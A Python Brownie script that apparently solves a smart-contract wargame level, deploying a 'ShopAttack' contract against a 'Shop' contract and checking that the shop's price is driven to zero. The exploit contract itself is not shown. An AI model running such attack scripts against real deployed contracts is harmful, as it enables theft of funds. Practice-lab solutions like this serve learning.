#!/usr/bin/python3
from brownie import Shop, ShopAttack
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account, convert
from colorama import Fore

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack(contract_address=None, attacker=None):
    if not contract_address:
        shop, _ = deploy()
        contract_address = shop.address
        _, attacker = get_account()
    else:
        shop = Shop.at(contract_address)

    attack_contract = ShopAttack.deploy(contract_address, {"from": attacker})

    print(f"{green}Shop price before the attack: {red}{shop.price()}{green}")

    attack_contract.buy({"from": attacker})

    print(f"{green}Shop price after the attack: {red}{shop.price()}{green}")

    assert shop.price() == 0


def main(contract_address=None, attacker=None):
    if contract_address:
        attack(contract_address, get_account())
    else:
        attack()


if __name__ == "__main__":
    main()
